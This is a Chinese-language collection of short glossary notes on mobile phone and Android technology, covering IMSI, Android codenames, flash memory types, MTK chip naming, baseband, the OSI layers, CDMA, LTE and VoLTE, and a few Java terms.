International Mobile SubscriberIdentification Number国际移动用户识别码，国际上为唯一识别一个移动用户所分配的号码。 是区别移动用户的标志，储存在SIM卡中，可用于区别移动用户的有效信息。其总长度不超过15位，同样使用0～9的数字。其中MCC是移动用户所属国家代号，占3位数字，中国的MCC规定为460；MNC是移动网号码，最多由两位数字组成，用于识别移动用户所归属的移动通信网；MSIN是移动用户识别码，用以识别某一移动通信网中的移动用户。
```

## [知识点] Android系统命名

```text
Android很别致的用甜点来命名它们系统版本的代号。于10月19日将在中国香港举行发布会，发布最新Android 4.0操作系统--Ice Cream Sandwich 冰激凌三明治。 据说下一个Android 5.0 将被命名为Jelly Bean 软糖豆。以下是目前已推出的Android的版本代号（注意是按照26个字母数序）：Android 1.0 - Apple pie 苹果派(推出日期：2008年2月)Android 1.1 - Banana Bread 香蕉面包(推出日期：2009年2月9日)Android 1.5 – Cupcake 纸杯蛋糕(推出日期：2009年4月30日)Android 1.6 – Donut 甜甜圈(推出网络SOHO网日期：2009年9月15日)Android 2.0 - Eclair 松饼(推出日期：2009年10月26日)Android 2.2 – Froyo 冻酸奶 (推出日期：2010年5月20日)Android 2.3 – Gingerbread 姜饼(推出日期：2010年12月6日)Android 3.0 – Honeycomb 蜂巢(推出日期：2011年2月22日)Android 4.0 – Ice Cream Sandwich 冰激凌三明治(推出日期：预计2011年10月19日)Android 5.0 – Jelly Bean 软糖豆(推出日期：2012年)
```

## [知识点] 网络类型

```text
2G，GSM模式（中国移动和中国联通的网络模式是一样的，手机和卡可以互用）。
CDMA（中国电信的网络模式，不可以和移动联通互用）。
2.5G，移动GPRS。
2.75G，移动EDGE。
3G，联通WCDMA，移动TD-CDMA（国内自主研发的），电信CDMA-2000。
3.5G，HSDPA，属于WCDMA范畴的，应该归例在3.5G范畴。美国已经普遍了。
中国联通在出3G时会直接升级成为HSDPA 的。
至于移动的TD，是我国自主研发的，貌似和HSDPA没什么关系。
```

## [知识点] NOR、NAND、EMMC

```text
NOR Flash 和 NAND Flash是现在市场上两种主要的非易失闪存技术。Intel于1988年首先开发出NOR Flash 技术，彻底改变了原先由EPROM(Electrically Programmable Read-Only-Memory电可编程序只读存储器)和EEPROM(电可擦只读存储器Electrically Erasable Programmable Read - Only Memory)一统天下的局面。紧接着，1989年，东芝公司发表了NAND Flash 结构，强调降低每比特的成本，有更高的性能，并且像磁盘一样可以通过接口轻松升级。NOR的特点是芯片内执行，这样应用程序可以直接在flash闪存内运行，不必再把代码读到系统RAM中。NOR的传输效率很高，但是很低的写入和擦除速度大大影响了它的性能。NAND结构能提供极高的单元密度，可以达到高存储密度，并且写入和擦除的速度也很快。应用NAND的困难在于flash的管理需要特殊的系统接口。比较：NOR的读速度比NAND稍快一些。NAND的写入速度比NOR快很多。NAND的4ms擦除速度远比NOR的5s快。大多数写入操作需要先进行擦除操作。NAND的擦除单元更小，相应的擦除电路更少。
EMMC (Embedded Multi Media Card) 为MMC协会所订立的内嵌式存储器标准规格，主要是针对手机产品为主。EMMC的一个明显优势是在封装中集成了一个控制器，它提供标准接口并管理闪存，使得手机厂商就能专注于产品开发的其它部分，并缩短向市场推出产品的时间。这些特点对于希望通过缩小光刻尺寸和降低成本的NAND供应商来说，具有同样的重要性。EMMC的设计概念，就是为了简化手机内存储器的使用，将NAND Flash芯片和控制芯片设计成1颗MCP芯片，手机客户只需要采购EMMC芯片，放进新手机中，不需处理其它繁复的NAND Flash兼容性和管理问题，最大优点是缩短新产品的上市周期和研发成本，加速产品的推陈出新速度。
```

## [知识点] SNS

```text
Social Networking Services，即社会性网络服务，专指旨在帮助人们建立社会性网络的互联网应用服务。也指社会现有已成熟普及的信息载体，如短信SMS服务。SNS的另一种常用解释：全称Social Network Site，即“社交网站”或“社交网”。社会性网络（Social Networking）是指个人之间的关系网络，这种基于社会网络关系系统思想的网站就是社会性网络网站(SNS网站)。
```

## [知识点] OHA(Open Handset Alliance)

```text
开放手机联盟,为Google与33家公司联手为Android移动平台系统的发展而组建的一个组织。这一联盟将会支持Google可能发布的手机操作系统或者应用软件，共同开发名为Android的开放源代码的移动系统。开放手机联盟包括手机制造商、手机芯片厂商和移动运营商几类。
```

## [知识点] OMA(Open Mobile Alliance)

```text
Open Mobile Alliance开放移动联盟，始创于2002年6月，WAP论坛（WAP Forum） 和开放式移动体系结构（Open Mobile Architecture） 两个标准化组织通过合并成立最初的OMA。随后，区域互用性论坛（Location Interoperability Forum (LIF)，SyncML，MMS互用性研究组（MMS Interoperability Group(MMS-IOP)） 和无线协会（Wireless Village），这些致力于推进移动业务规范工作的组织又相继加入OMA。此外，移动博弈互用性论坛（Mobile Gaming Interoperability Forum (MGIF)） 和移动无线因特网论坛（Mobile Wireless Internet Forum (MWIF)） 都表明了自己想加入OMA的意图。截至成立当年11月份，OAM就已发展成员公司约300家。其成员公司包括了世界主要的移动运营商，设备和网络供应商，信息技术公司，应用发展商和内容提供商。整个价值链上的成员共同协作，以确保为全世界的终端用户提供无缝的移动业务。OMA的形成标志着移动业务的发展向前迈出了重要的一步，避免了由于分散的个体而容易导致的技术上的孤立。几个规范组织的合并，有利于信息和资源的共享，促进了工作的流程化，减少了不必要的重复劳动。一个统一的合法框架确保了技术和标准的真正意义上的互用性测试。这将使市场运作更加快捷并减少了工业总成本和复杂性。开放式移动联盟的任务是为全球的用户消除不同系统间的屏障，确保无缝的互用性业务，促进整个移动工业市场的发展。
```

## [知识点] 智能手机组成部分

```text
智能手机可以被看作袖珍的计算机。它有处理器、存储器、输入输出设备（键盘、显示屏、USB接口、耳机接口、摄像头等）及I/O通道。手机通过空中接口协议（例如GSM、CDMA、PHS等）和基站通信，既可以传输语音，也可以传输数据。

电路板是智能手机的核心部件，电路板中包括很多手机专用芯片，这些芯片包括：射频芯片、射频功放芯片、处理器芯片、电源管理芯片、存储芯片、触摸屏控制芯片等。

2.1、智能手机的硬件系统结构
智能手机的硬件系统结构包括双处理器结构和单处理器结构两种。

1．双处理器结构

双处理器结构智能手机主要包括：主处理器和从处理器，如图5所示。主处理器运行开放式操作系统以及操作系统之上的各种应用，负责整个系统的控制；从处理器负责基本无线通信，主要包括DBB（DigitalBaseband，数字基带芯片）和ABB（AnalogBaseband，模拟基带），完成语音信号和数字语音信号调制解调、信道编码解码和无线Modem控制。

主处理器也叫AP（ApplicationProcessor，应用处理器），从处理器也叫BP（BasebandProcessor，基带处理器），它们之间通过串口、总线或USB等方式进行通信，不同手机芯片生产集成厂家采用的集成方式都不一样，目前市面上仍以串口通信为主。

其实，智能手机只是在传统手机的基本硬件结构中BP的部分增加一定的外围电路，如音频芯片、LCD控制、摄像机控制器、扬声器、天线等，就构成了一个完整的智能手机的硬件结构。

2．单处理器结构

单处理器智能手机只包括一个处理器，所谓的单处理器就是说智能手机的基本通信功能（通话、信息、GPRS等）和多媒体、应用软件的处理只用一个处理器来解决。这枚单处理器集成了数字基带、模拟基带、射频、电源管理、SRAM等功能，如图6所示。

2.2、负责调制和解调信号的射频芯片
在手机终端中，射频芯片负责射频收发、频率合成、功率放大；而基带芯片负责信号处理和协议处理。简单地说，射频芯片起到一个发射机和接收机的作用。有的射频芯片还为处理器芯片提供26MHz的系统时钟信号。如图7所示为智能手机中的射频芯片。

2.3、放大信号的射频功率放大器芯片
智能手机中的射频功率放大器芯片的作用主要是对射频信号进行放大，使得有足够的功率发射给基站。射频功率放大器是智能手机中耗电量较大的元件之一，它内部主要集成了滤波器、放大器、匹配电路、功率检测、偏压控制等电路。如图8所示为射频功率放大器芯片。

2.4、中央处理器芯片
中央处理器（CenterProcessingUnit，CPU）芯片是智能手机的核心部件，手机中的微处理器类似计算机中的中央处理器，它是整台智能手机的控制中枢系统，也是逻辑部分的控制核心。微处理器通过运行存储器内的软件及调用存储器内的数据库，达到对手机整体监控的目的。凡是要处理的数据都要经过CPU来完成，手机各个部分的管理等都离不开微处理器这个司令部的统一、协调指挥。随着集成电路生产技术及工艺水平的不断提高，手机中微处理器的功能越来越强大，如在微处理器中集成先进的数字信号处理器（DSP）等。处理器的性能决定了整部手机的性能。目前智能手机处理器厂商主要有：德州仪器、Intel、高通、三星、Marvell、英伟达、华为等。如图9所示为手机处理器芯片。

2.5、管理手机供电的电源管理芯片

电源管理芯片（PowerManagemenTIntegratedCircuits）是在智能手机系统中承担对电能的变换、分配、检测及其他电能管理职责的芯片。同时，还可以对电池充电进行管理和控制，如图10所示。

2.6、储存信息的存储芯片
智能手机的存储器有多种：Flash存储器、RAM随机存储器、ROM只读存储器等，其中，手机存储器主要用来存储手机的主程序、字库、用户程序、用户数据等，如图11所示。

RAM随机存储器主要用于存储智能手机运行时的程序和数据，需要执行的程序或者需要处理的数据都必须先装入RAM内。

ROM只读存储器是指只能从该设备中读取数据而不能往里面写数据的存储器。ROM中的数据是由手机制造商事先编好固化在里面的一些程序，使用者不能随意更改。ROM主要用于检查手机系统的配置情况，并提供最基本的输入输出（I/O）程序。

Flash存储器是一种长寿命的非易失性（在断电情况下仍能保持所存储的数据信息）存储器，数据删除不是以单个的字节为单位，而是以固定的区块为单位。由于Flash存储器断电时仍能保存数据，它通常被用来保存设置信息，如用户对手机的设置信息等。

2.7、管理声音的音频处理器芯片
智能手机的音频处理器主要处理手机的声音信号，它主要负责接收和发射音频信号，是实现手机听见对方声音的关键元件。音频处理器对基带信号进行解码、D/A转换等处理后输出音频信号。如图12所示为音频处理器芯片。
```

## [知识点] chip id

```text
基带芯片的唯一的chip id（CPUID）
Userdata的backup和restore是读取的chip id，此id在/proc/rid，如果不一样，就不能实现不同机器的userdata backup和restore，请知悉。
```

## [知识点] AOSP

```text
Android Open Source Project
```

## [知识点] AOKP

```text
AOKP 的全称为“Android Open-Source Kang Project”，比AOSP多了一个“Kang”。在Android社区中，Kang是一个术语，即用来表示这是一个被他人修改过的ROM，修改ROM的人不属于制作ROM的团队或没有该团队的授权。
```

## [知识点] CM

```text
CM 是CyanogenMod 的简称，Cyanogen团队是全球最大的第三方ROM编译团队，覆盖机型范围相当之广，几乎所有热门机型都有相对应的CM ROM可以刷机使用。国内知名ROM作品 MIUI 早期也是直接采用了CM 的源代码，才能迅速在多个机型上普及。
http://www.cyanogenmod.org/
```

## [知识点] MTK 芯片命名规则及常见 MTK 芯片

```text
MT6795M
第一个数字6:表示芯片用途，6为手机，8为平板
第二个数字7:标示指令集类型，5为32位，7为64位，2为功能机
第三个数字9:芯片定位，3为入门，5为中端，7双核，8四核，9为旗舰八核
第四个数字5:芯片世代，数字越大发布越晚，性能越强
最后一个字母M:细分版本，T为高端增强版，没有字母为标准版，M为降频低配版
https://blog.csdn.net/zhangbijun1230/article/details/79440291

MT2503
联发科技MT2503基于高度集成的超小型系统级封装，整合蓝牙3.0、多星系GNSS系统和2G基带，搭载集成内存的ARMv7微控制潜在应用领域包括具备简单应用功能的可穿戴设备、可移动的资产跟踪设备、注重安全的工业应用。

MT6737
MT6737是联发科技极具成本效益的R.9 Cat-4 LTE解决方案，不但能将模块及内存成本降至最低，符合中低端市场需求，同时具备超越同级产品的性能与电源效能表现。此外，MT6737能在全球范围内支持各式IP多媒体子系统(IMS)，支持VoLTE、ViLTE、VoWiFi、RCS的快速数据传输功能，让消费者感受丰富的移动体验。 MT6737提供优质的多媒体、显示与拍照摄像功能，适用于全球各种高性价的手机平板设备，让消费者享有丰富又实惠的使用体验。仅用512MB的内存便能顺畅运行Android M操作系统。 此外，MT6737的电源效率表现大幅超越同类产品，在GPS与FM模式的耗电量相对较低。性能方面，MT6737搭载Cortex-A53的四核心64位处理器(MT6737T的最高主频1.5GHz)，以及Mali T720 MP2 图像处理器(MT6737的最高频率600MHz)，能顺畅运行各式3D游戏等高端Android应用程序。

MT6735
联发科技 MT6735 64 位四核心 WorldMode 4G LTE 平台是以 ARM® Cortex®-A53 64 位处理器及 ARM Mali™-T720 图像卡打造，专门针对超级中端市场而研发，提供卓越的移动使用体验，并为消费者带来更多价格适中的智能手机选择。 MT6735 支持整合式 4G LTE WorldMode 及 CDMA2000 3G，让您在全球每个角落也可享受高速移动网络连接，而双频 802.11n Wi-Fi 及蓝牙 4.0 则可支持高效无线网络及设备。它的 1300 万像素图像信号处理器可支持高质量智能手机相机应用程序。另外，MT6735 配备 720p HD 显示器，录像及播放 1080p Full HD 视频不在话下。

MT8176
MT8176采用频率高达2GHz的ARM®Cortex®-A72双核心和Cortex-A53四核心架构，并配备频率600MHz的超强PowerVR GX6250绘图处理器，MT8176卓越性能在高阶平板芯片与高画质多媒体娱乐产品市场中保有领先地位。MT8176同时支持802.11 b/g/n/ac Wi-Fi、蓝芽、GPS功能，可快速连接各种装置，更搭载20MP业界顶级的ISP影像讯号处理器。 联发科技MT8176具备联发科技的独家技术，包含Imagiq技术、MiraVision技术、Pump Express Plus 2.0快速充电技术，以及SmartScreen智能屏幕显示技术。
联发科技MT8176助力平板制造商打造高性能的多媒体平板电脑，浏览速度媲美桌面计算机，3D游戏逼真刺激的体验近似游戏机，让消费者在家就能享受电影院等级的影音盛宴。

点击下载：MT6580
MT6580，28nm工艺，四核心A7 1.3GHz，Mali-400MP2 GPU，800+500万像素摄像头、支持3G。

MT6572
联发科技 MT6572 可在不损电池使用时间的情况下，为入门级智能型手机提供双核心效能表现。它配备节能的双核心 ARM® Cortex®-A7 处理器，并采用优化了成本效益的系统级设计，简化了产品研发工序，从而降低生产成本，亦让产品可更快面世。MT6572 提供众多联机选择，包括 Wi-Fi、蓝牙及 GPS；在多媒体功能方面，联发科技 MiraVision™ 技术提供 960 x 540 画质，亦备有图片增强功能、720p HD 视频播放功能以及 500 像素镜头。

MT6753
MT6753 64 位八核心 WorldMode 4G LTE 平台是以 ARM® Cortex®-A53 64 位处理器及 ARM Mali™-T720 打造，专门针对超级中端市场而研发，提供卓越的移动使用体验，并为消费者带来更多价格适中的智能手机选择。 MT6753 支持整合式 WorldMode 4G LTE 及 CDMA2000 3G，让您在全球每个角落也可享受高速移动网络连接，而双频 802.11n Wi-Fi 及蓝牙 4.0 则可支持高效无线网络及设备。它的 1600 万像素图像信号处理器可支持高质量智能手机相机应用程序。另外，MT6753 配备 1080p Full HD 显示器，录像及播放 Full HD 视频不在话下。

MT8735
MT8735是用于主流蜂窝平板电脑市场的高度集成的64位平板电脑片上系统（SoC），具有4G LTE调制解调器和全连接（蓝牙，FM，WLAN和GPS）。 MT8735B / D是MT8735系列的最新发展，提供一流的多媒体性能，更好的处理能力，改进的连接子系统，降低制造商在全球主流市场成功开发设备的成本。

MT6758
MT6758具有集成蓝牙，FM，WLAN和GPS模块,是集成了调制解调器和应用处理子系统的高度集成的基带平台，该芯片集成了运行高达2.3GHz的ARM Cortex-A53，MIPS @ interAptiv MCU和强大的 多标准视频编解码器 此外，还包括一系列广泛的接口和连接外设，可与摄像机，触摸屏显示器和MMC / SD卡接口。

MT8163
联发科技 MT8163 这款高度整合式系统单芯片 (SoC) 囊括了各项先进的功能特色，例如四核心 ARM® Cortex-A53 MPCore™、3D 图像技术 (OpenGL|ES 3.1)、1300 万像素镜头影像信号处理器 (ISP)、DDR3/L 800 MHz 及高清 1080p 视频译码器。MT8163 可协助平板电脑制造商打造高效能的媒体平板电脑，配以媲美 PC 计算机的浏览器，塑造 3D 游戏及影院级家庭娱乐体验。

MT6750
MT6750单芯片是联发科技支持LTE Cat-6技术的中端产品，以八核心的强大运算能力执行新一代的调制解调技术，支持各式主流的IP多媒体子系统(IMS)，包含 VoLTE、ViLTE、VoWiFi、RCS ，以优异性能提升界面显示效果、多媒体内容与拍照体验等等，大大满足用户需求。
MT6750具备强大的运算能力，无论是功耗，还是性能表现都都较上一代产品有所提升。MT6750是Cortex-A53八核心处理器(最高主频1.5GHz)，搭载Mali T860双图像处理器(最高频率650MHz)，同时支持高达4GB 的LPDDR3内存(MT6750T最高频率为833MHz)。

MT6582
MT6582 为主流 3G 智能手机带来四核心效能，同时保持长效电池使用时间。它配备节能的 ARM® Cortex®-A7 处理器，并采用优化了成本效益的系统级设计，简化了产品研发工序，从而降低生产成本，亦让产品可更快面世。MT6582 提供众多联机选择，包括 Wi-Fi、蓝牙及 GPS；在多媒体功能方面，联发科技 MiraVision™ 技术提供 720p HD 画质，亦备有图片增强功能、1080p Full HD 视频播放功能以及 800 像素镜头。

其他手机芯片如高通、三星、华为等的命名规则
http://www.360doc.com/content/18/0307/22/38623992_735247087.shtml
```

## [知识点] sr6750_35g_n软件包中每个代表的信息

```text
以6755 N的make文件为例，前4个数字代表平台（说明6750 & 6755都是用这套代码）；
第5个数字，是3或6，3代表32位系统，6代表64位系统。64位系统的CTS测试case要比32位多很多
第6个数字，是5或者6，5代表5模，6代表6模
g代表GMO版本，GMO的特点是MTK裁剪了某些feature，用于节省ram，以便512M内存也可以用
n代表android版本为N
```

## [知识点] efuse

```text
一次性可编程存储器。eFuse的诞生源于几年前IBM工程师的一个发现：与更旧的激光熔断技术相比，电子迁移(EM)特性可以用来生成小得多的熔丝结构。EM熔丝可以在芯片上编程，不论是在晶圆探测阶段还是在封装中。采用I/O电路的片上电压(通常为2.5V)，一个持续200微秒的10毫安直流脉冲就足以编程单根熔丝。
```

## [知识点] WAPI

```text
WAPI(Wireless LAN Authentication and Privacy Infrastructure)是无线局域网鉴别和保密基础结构，是一种安全协议，同时也是中国无线局域网安全强制性标准，最早由西安电子科技大学综合业务网理论及关键技术国家重点实验室提出
```

## [知识点] vold

```text
volume Daemon
```

## [知识点] DSL 式编程???

```text
领域专属语言(DSL, Domain Specific Language)。

使用xml, json, yaml等标记语言实现对数据的描述，比如通过XML描述如何依赖注入的Spring框架，通过XML实现免硬编码的AOP等，通过yaml发布/订阅微服务，这些一般用于企业项目，配置繁琐但是的确能够处理复杂的业务需求。Android中通过xml描述界面布局等，其实你自定义控件时的app:xx属性就是不经意间新建的元数据。
使用groovy, 注解实现对数据的描述，比如ORM框架，SpringBoot框架，SOA框架，通过注解描述信息，并最终通过动态代理将注解拼接为实际请求
```

## [知识点] 基带baseband

```text
Baseband 基带。信源（信息源，也称发终端）发出的没有经过调制（进行频谱搬移和变换）的原始电信号所固有的频带（频率带宽），称为基本频带，简称基带。
基带（英语：baseband）是频率范围非常窄的信号，也就是说幅度谱仅在原点（f = 0）附近才是非零的，其他频率几乎可以忽略。在电信与信号处理中，基带信号是未经载波调制的信号，即该信号的频率范围没有任何移位，而且频率很低 - 包含频带从接近 0 Hz到更高截止频率或最大带宽。

由于基带信号是未经载波调制的信号，在GPS接收机和移动电话等无线数字通讯领域，基带信号有时也泛指已经过射频前端处理后的信号。在无线通讯设备中，来自天线的信号先经射频前端的模拟电路接收，然后再转交给后续的数字电路进一步处理，而后者就是基带处理器。在当前中文语境中，手机基带处理器所带的固件也简称“基带”。
```

## [知识点] 无线电

```text
无线电，又称无线电波、射频电波、电波，或射频，是指在自由空间（包括空气和真空）传播的电磁波，在电磁波谱上，其波长长于红外线光（IR）。频率范围为300 GHz以下[1]  ，其对应的波长范围为1毫米以上。就像其他电磁波一样，无线电波以光速前进。经由闪电或天文物体，可以产生自然的无线电波。由人工产生的无线电波，被应用在无线通讯、广播、雷达、通讯卫星、导航系统、电脑网络等应用上。

无线电发射机，借由交流电，经过振荡器，变成高频率交流电，产生电磁场，而经由电磁场可产生无线电波[2] 。无线电波像磁铁，有同性相斥、异性相吸的现象。同类电子会互相排斥，因此当无线电波射出时，会将前方电波往前推，当连续电波一直射出来时，电波就会在空气中传播[3] 。

无线电技术是通过无线电波传播信号的技术，其原理在于，导体中电流强弱的改变会产生无线电波。利用这一现象，通过调制可将信息加载于无线电波之上。当电波通过空间传播到达收信端，电波引起的电磁场变化又会在导体中产生电流。通过解调将讯息从电流变化中提取出来，就达到了资讯传递的目的。
```

## [知识点] 蜂窝电话CellPhone

```text
蜂窝电话或移动电话是当前最普遍应用的无线通信方式。蜂窝电话覆盖区通常分为多个小区。每个小区由一个基站发射机覆盖。理论上，小区的形状为蜂窝状六边形，这也是蜂窝电话和蜂窝网络名称的来源。当前广泛使用的移动电话系统标准包括：GSM、CDMA和LTE
卫星电话存在两种形式：国际海事卫星组织和铱星系统。两种系统都提供全球覆盖服务。国际海事卫星组织使用地球同步卫星，需要定向的高增益天线。铱星则是低轨道卫星系统，直接使用手机天线。
TETRA系统具有无线电话的功能。
```

## 渐进式加载

```text
渐进式加载，简单来说，就是一部分一部分加载，当前帧加载完成之后，再去加载下一帧。

一种极致的做法是，加载 xml 文件，就想加载一个空白的 xml，布局全部使用 ViewStub 标签进行懒加载。

这样设计的好处是可以减缓同一时刻，加载 View 带来的压力，通常的做法是我们先加载核心部分的 View，再逐步去加载其他 View。

有人可能会这样问了，这样的设计很鸡肋，有什么用呢？
```

## [知识点] POJO 和 JavaBean

```text
POJO 和JavaBean是我们常见的两个关键字，一般容易混淆，POJO全称是Plain Ordinary Java Object / Pure Old Java Object，中文可以翻译成：普通Java类，具有一部分getter/setter方法的那种类就可以称作POJO，但是JavaBean则比 POJO复杂很多， Java Bean 是可复用的组件，对 Java Bean 并没有严格的规范，理论上讲，任何一个 Java 类都可以是一个 Bean 。但通常情况下，由于 Java Bean 是被容器所创建（如 Tomcat) 的，所以 Java Bean 应具有一个无参的构造器，另外，通常 Java Bean 还要实现 Serializable 接口用于实现 Bean 的持久性。 Java Bean 是不能被跨进程访问的。JavaBean是一种组件技术，就好像你做了一个扳子，而这个扳子会在很多地方被拿去用，这个扳子也提供多种功能(你可以拿这个扳子扳、锤、撬等等)，而这个扳子就是一个组件。一般在web应用程序中建立一个数据库的映射对象时，我们只能称它为POJO。POJO(Plain Old Java Object)这个名字用来强调它是一个普通java对象，而不是一个特殊的对象，其主要用来指代那些没有遵从特定的Java对象模型、约定或框架（如EJB）的Java对象。理想地讲，一个POJO是一个不受任何限制的Java对象（除了Java语言规范） [1]   。
错误的认识
POJO是这样的一种“纯粹的”JavaBean，在它里面除了JavaBean规范的方法和属性没有别的东西，即private属性以及对这个属性方法的public的get和set方法。我们会发现这样的JavaBean很“单纯”，它只能装载数据，作为数据存储的载体，而不具有业务逻辑处理的能力。
```

## [知识点] BLE

```text
低耗电蓝牙BLE（Bluetooth Low Energy）
```

## [知识点] OSI

```text
第7层 应用层
主条目：应用层
应用层（Application Layer）提供为应用软件而设计的接口，以设置与另一应用软件之间的通信。例如：HTTP、HTTPS、FTP、Telnet、SSH、SMTP、POP3等。

第6层 表示层
主条目：表示层
表示层（Presentation Layer）把数据转换为能与接收者的系统格式兼容并适合传输的格式。

第5层 会话层
主条目：会话层
会话层（Session Layer）负责在数据传输中设置和维护计算机网络中两台计算机之间的通信连接。

第4层 传输层
主条目：传输层
传输层（Transport Layer）把传输表头（TH）加至数据以形成数据包。传输表头包含了所使用的协议等发送信息。例如:传输控制协议（TCP）等。

第3层 网络层
主条目：网络层
网络层（Network Layer）决定数据的路径选择和转寄，将网络表头（NH）加至数据包，以形成分组。网络表头包含了网络资料。例如:互联网协议（IP）等。

第2层 数据链路层
主条目：数据链路层
数据链路层（Data Link Layer）负责网络寻址、错误侦测和改错。当表头和表尾被加至数据包时，会形成信息框（Data Frame）。数据链表头（DLH）是包含了物理地址和错误侦测及改错的方法。数据链表尾（DLT）是一串指示数据包末端的字符串。例如以太网、无线局域网（Wi-Fi）和通用分组无线服务（GPRS）等。

分为两个子层：逻辑链路控制（logical link control，LLC）子层和介质访问控制（Media access control，MAC）子层。

第1层 物理层
主条目：物理层
物理层（Physical Layer）在局部局域网上发送数据帧（Data Frame），它负责管理电脑通信设备和网络媒体之间的互通。包括了针脚、电压、线缆规范、集线器、中继器、网卡、主机接口卡等。
```

## [知识点] CDMA

```text
码分多址（英语：Code Division Multiple Access，即：CDMA）或分码多重进接、码分复存，是一种多址接入的无线通信技术。CDMA最早用于军用通信，但时至今日，已广泛应用到全球不同的民用通信中。在CDMA移动通信中，将语音频号转换为数字信号，给每组数据语音分组增加一个地址，进行扰码处理，然后将它发射到空中。CDMA最大的优点就是相同的带宽下可以容纳更多的呼叫，而且它还可以随语音传送数据信息。

一般来说（作为复用方法），CDMA是被美国军方通讯采用的一种扩频方案。理论上，数据化的信息使用CDMA技术进行编码和解码，可以大大提高对无线信道的利用率，增强抗干扰能力。高通公司解决了CDMA中至关重要的功率控制问题，并取得相关的专利。CDMA制式中，区分各个通道主要不再依靠频率和时隙等方法，因此同一地区不同用户同时使用相同的频率是正常的。除此之外被广泛使用的多路访问技术还有时分多址（TDMA）和频分多址（FDMA）。在这三种方案中，接收方从各种信号中分别通过不同的码字、时隙和频率通道分离出有用信息。

CDMA经常被广泛和不严格地用来称呼使用CDMA技术实现的无线网络及其制式，比较常见的是由Qualcomm主要支持和最先投入商用的数字蜂窝电话制式，包括IS-95（CDG为其申请注册商标为cdmaOne）和它的演进版本IS-2000（CDMA2000），其他很少这样使用。由于WCDMA和TD-SCDMA也使用了CDMA技术，这样的称呼可能会造出一些混乱。
```

## [知识点] C2K 是什么意思?

```text
C2K  : CDMA2000
EVDO : 表示支持中国电信3G数据业务。
CDMA2000是网络制式，类似于GSM、WCDMA、TD-SCDMA
EVDO是该制式下的一种网络技术，以实现3G的高速数据链接，类似于WCDMA的EDGE、HSPA等。
在中国电信3G网络中，将CDMA2000划分为CDMA 1X和CDMA EVDO，其中1X特指CS业务（主要是语音通话业务），而EVDO则独立支持高速3G数据业务，也就是通常用户体验的高速数据业务下载应用，都承载在EVDO网络上
```

## [知识点] LTE

```text
长期演进技术（英语：LTE，Long Term Evolution）是电信中用于手机及数据终端的高速无线通讯标准，为高速下行分组接入（HSDPA）过渡到4G的版本，俗称为3.9G。该标准基于旧有的GSM/EDGE和UMTS/HSPA网络技术，并使用调制技术提升网络容量及速度[1]  [2] 。 长期演进技术该标准由3GPP（第三代合作伙伴计划）于2008年第四季度于Release 8版本中首次提出，并在Release 9版本中进行少许改良。

分时长期演进（英语：Long Term Evolution，Time-Division Duplex，简称“LTE-TDD”）是基于3GPP长期演进技术（英语：LTE）的一种通讯技术与标准，属于LTE的一个分支。该技术由上海贝尔、诺基亚西门子通信、大唐电信、华为技术、中兴通信、中国移动、高通、ST-Ericsson等业者共同开发。

TD-LTE是LTE-TDD的商业名称，它是由中国移动等主导创立的TD-LTE全球发展倡议组织（GTI, Global TD-LTE Initiative）推动支持的LTE-TDD标准化与商业化项目。[21]  [22] 

TDD即指时分双工（英语：Time-division duplex），LTE更加普遍使用的是FDD即频分双工（英语：Frequency-division duplex）。值得注意的是，中国媒体普遍将TD-LTE宣传为中国国产标准，事实上其技术属于LTE（长期演进技术）。[来源请求] 正因为都是LTE的分支，LTE-TDD与LTE-FDD标准的重合度很高，差别不大，也各有优缺点。[来源请求] 两者分别跟3G的TD-SCDMA和WCDMA的继承性不大，LTE-FDD跟WCDMA的继承性甚至更小。中国政府和企业是TD-LTE的主要推动者。LTE-TDD技术主要吸引了三类运营商，分别是：PHS运营商、WiMAX运营商、以及大量持有持零散频谱的非对称频段的小规模运营商。

LTE和其派生的LTE-TDD在商业上一般被宣传为4G（第四代移动通信技术），不过3GPP家族中唯一受国际电信联盟认可的4G为LTE的升级版即LTE-Advanced（LTE-A）（另一4G标准是IEEE家族的WirelessMAN-Advanced）。[来源请求] 相应的，LTE-TDD的升级版叫做LTE-TDD Advanced（TD-LTE-A）。

TD-LTE的频率分配因国家而异。美国一个在建的LTE-TDD系统使用了2496-2690MHz的Band 41频率资源。中国也将Band 41分配给了LTE-TDD。另外，中国还将band 39（1880-1920MHz）分配给LTE-TDD使用。在英国，一个商用LTE-TDD网络使用了3.5/3.6GHz（Band 42,43）频段。

对于WiMax运营商来说，同样使用单一频段的LTE-TDD是很好的网络替代和升级技术，因为LTE-FDD都是上行下行分开频段，现有的WiMax营运商都没有这类型的频段和执照。

VoLTE（Voice Over LTE，LTE高解析语音）：该方案基于IP多媒体子系统（IMS）网络，配合GSMA在PRD IR.92中制定的在LTE控制和媒体层面的语音服务标准。使用该方案意味着语音将以数据流形式在LTE网络中传输，所以无需调用传统电路交换网络，旧网络将无需保留。

CSFB（Circuit Switched Fallback，电路交换网络支持）：该方案中的LTE网络将只用于数据传输，当有语音拨叫或呼入时，终端将使用原有电路交换网络（例如3G UMTS），这种技术就叫CS Fallback。该方案只需运营商升级现有MSC核心网而无需创建IMS网络，因此运营商可以较迅速地向市场推出网络服务。也由于语音通话需要切换网络才能使用的缘故，通话接通时间将被延长。

SVLTE（Simultaneous Voice and LTE，LTE与语音网同步支持）：该方案使用可以同时支持LTE网络和电路交换网络的终端，使得运营商无需对当前网络作太多修改。但这同时意味着终端价格的昂贵和电力消耗的迅速。

高解析语音
考虑到兼容性问题，3GPP要求至少支持AMR-NB编码（窄带）。不过VoLTE推荐使用AMR-WB语音编码，也被称作HD Voice。该编码在3GPP标准族网络下支持16KHz的采样率。
```

## [知识点] VOLTE、VILTE、VOWIFI、VOIP、SDN、FDN

```text
VOLTE 基于LTE的语音通话(VO = voice)，用流量打电话，用LTE承载，但是用分钟数收钱，优点是用数据流量传输数据，音质更好，电话接通更快
VILTE 基于LTE的视频通话(VI = video)
VOWIFI 基于wifi的语音通话(VO = voice)，用wifi打电话，用wifi承载，这三个都是基于运营商的功能
VOIP 是互联网通话，跟运营商应该没啥关系，需要第三方的apk去实现
SDN 预置默认联系人
FDN 固定联系人
```

## [知识点] 常用运营商制式

```text
手机网络制式主要包括GSM、CDMA、3G、4G四种，手机自问世至今，经历了第一代模拟制式手机（1G）、第二代GSM、TDMA等数字手机（2G）、第2.5代移动通信技术GPRS、第三代移动通信技术3G、第四代移动通信技术4G
中国移动：band1、band8
中国联通：band1、band8
美频：band2、band4、band5
欧频：band1、band8
```

## [知识点] BIO、NIO和AIO?

```text
https://juejin.im/post/5d19820c6fb9a07ea42094e2

BIO（Blocking I/O）：同步阻塞I/O模式。
NIO（New I/O）：同步非阻塞模式。
